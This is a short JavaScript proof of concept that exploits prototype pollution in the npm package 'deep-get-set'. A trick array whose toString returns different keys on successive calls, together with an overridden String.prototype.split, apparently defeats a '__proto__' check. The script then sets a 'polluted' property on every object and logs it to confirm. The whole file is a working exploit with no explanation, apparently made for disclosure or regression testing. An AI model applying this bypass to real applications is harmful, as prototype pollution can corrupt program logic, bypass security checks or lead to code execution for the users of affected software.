var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const deep = require('deep-get-set');
console.log({}.polluted);
deep({}, [
    '__proto__',
    'polluted'
], 'yes');
console.log({}.polluted);